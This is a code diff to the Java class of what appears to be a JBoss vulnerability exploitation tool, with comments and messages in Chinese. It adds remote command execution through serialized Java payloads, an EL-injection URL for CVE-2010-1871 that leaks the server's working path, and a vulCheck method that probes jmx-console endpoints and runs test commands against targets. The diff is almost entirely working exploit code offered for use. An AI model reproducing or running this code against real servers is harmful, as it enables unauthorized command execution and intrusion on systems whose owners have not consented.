@@ -112,6 +112,16 @@ public class UtilMethod {
         return result;
     }
 
+    /**
+     * 命令执行工具方法
+     *
+     * @param index     漏洞编号索引 0-7
+     * @param targetUrl 目标url
+     * @param cmd       命令
+     * @param flag      uploadJarFlag
+     * @return resp body
+     * @throws Exception
+     */
     public static String commandExploit(int index, String targetUrl, String cmd, boolean flag) throws Exception {
         String result = null;
         String charset = "utf-8";
@@ -120,14 +130,17 @@ public class UtilMethod {
             url = getExploitUrl(index, targetUrl, targetUrl);
             byte[] payload;
             if (!flag) {
-                payload = GenPoc.getObject("../.readme.html.tmp", (byte[]) null);
-                MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                try {
+                    payload = GenPoc.getObject("../.readme.html.tmp", null);
+                    MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
-
             payload = GenPoc.expolit(cmd);
             byte[] exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
             result = GenPoc.getCommandResult(exploitResult);
-        } else if (index == 3) {
+        } else if (index == 3) { // CVE-2010-1871
             String httpResult;
             if (cmd.equals("pwd")) {
                 url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7brequest.getRealPath('/')%7d";
@@ -140,7 +153,14 @@ public class UtilMethod {
                 if (httpResult == null) {
                     result = "网络连接错误";
                 } else if (httpResult.contains("user=java.lang.UNIXProcess")) {
-                    result = "命令执行成功";
+                    url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7brequest.getRealPath('/')%7d";
+                    httpResult = MainMethod.httpRequest(url, charset, "GET");
+                    String p = "user=(.*)&conversationId";
+                    String result_path = getMatch(p, httpResult);
+
+                    result = "命令执行成功\n\r";
+                    result = result + "获取到pwd路径：" + result_path + "\n\r";
+                    result = result + "无法确认目标是否出网，建议手工验证";
                 } else {
                     result = "命令执行失败";
                 }
@@ -170,7 +190,108 @@ public class UtilMethod {
         return url;
     }
 
-    public static String vulCheck(int index, String targetUrl) {
+    public static String vulCheck(int index, String targetUrl) throws Exception {
+        String charset = "utf-8";
+        String result = null;
+        String url;
+        String httpResult;
+        int statusCode;
+        switch (index) {
+            case 0:
+                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
+                if (httpResult == null) {
+                    result = "检测" + Utils.bugs_mainTab[0] + "漏洞失败，网络连接错误";
+                } else if (httpResult.contains("MBean Inspector")) {
+                    result = "存在" + Utils.bugs_mainTab[0] + "漏洞";
+                } else {
+                    result = "不存在" + Utils.bugs_mainTab[0] + "漏洞," + httpResult;
+                }
+                break;
+            case 1:
+                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
+                if (httpResult == null) {
+                    result = "检测" + Utils.bugs_mainTab[1] + "漏洞失败，网络连接错误";
+                } else if (httpResult.contains("MBean Inspector")) {
+                    result = "存在" + Utils.bugs_mainTab[1] + "漏洞";
+                } else {
+                    result = "不存在" + Utils.bugs_mainTab[1] + "漏洞," + httpResult;
+                }
+                break;
+            case 2:
+                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
+                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
+                if (response != null) {
+                    statusCode = response.getStatusLine().getStatusCode();
+                    switch (statusCode) {
+                        case 200:
+                            if (response.getFirstHeader("Content-Length") != null) {
+                                result = "存在" + Utils.bugs_mainTab[2] + "漏洞";
+                            } else {
+                                result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
+                            }
+
+                            return result;
+                        case 401:
+                            result = "需要认证登录";
+                            return result;
+                        case 500:
+                            result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
+                            return result;
+                        default:
+                            result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，状态码为：" + statusCode;
+                    }
+                } else {
+                    result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，网络连接错误";
+                }
+                break;
+            case 3:
+                String str3 = UtilMethod.commandExploit(3, targetUrl, "echo xxx", false);
+                if (str3.contains("未找到命令执行结果，命令可能执行失败！")) {
+                    result = "未找到命令执行结果，命令可能执行失败！";
+                } else {
+                    result = "存在" + Utils.bugs_mainTab[3] + "漏洞";
+                }
+                break;
+            case 4:
+                String str4 = UtilMethod.commandExploit(4, targetUrl, "echo xxx", false);
+                if (str4.contains("未找到命令执行结果，命令可能执行失败！")) {
+                    result = "未找到命令执行结果，命令可能执行失败！";
+                } else {
+                    result = "存在" + Utils.bugs_mainTab[4] + "漏洞";
+                }
+                break;
+            case 5:
+                String str5 = UtilMethod.commandExploit(5, targetUrl, "echo xxx", false);
+                if (str5.contains("未找到命令执行结果，命令可能执行失败！")) {
+                    result = "未找到命令执行结果，命令可能执行失败！";
+                } else {
+                    result = "存在" + Utils.bugs_mainTab[5] + "漏洞";
+                }
+                break;
+            case 6:
+                String str6 = UtilMethod.commandExploit(6, targetUrl, "echo xxx", false);
+                if (str6.contains("未找到命令执行结果，命令可能执行失败！")) {
+                    result = "未找到命令执行结果，命令可能执行失败！";
+                } else {
+                    result = "存在" + Utils.bugs_mainTab[6] + "漏洞";
+                }
+                break;
+            case 7:
+                String str7 = UtilMethod.commandExploit(7, targetUrl, "echo xxx", false);
+                if (str7.contains("未找到命令执行结果，命令可能执行失败！")) {
+                    result = "未找到命令执行结果，命令可能执行失败！";
+                } else {
+                    result = "存在" + Utils.bugs_mainTab[7] + "漏洞";
+                }
+                break;
+        }
+
+        return result;
+    }
+
+    public static String vulCheck1(int index, String targetUrl) {
         String charset = "utf-8";
         String result = null;
         String url;
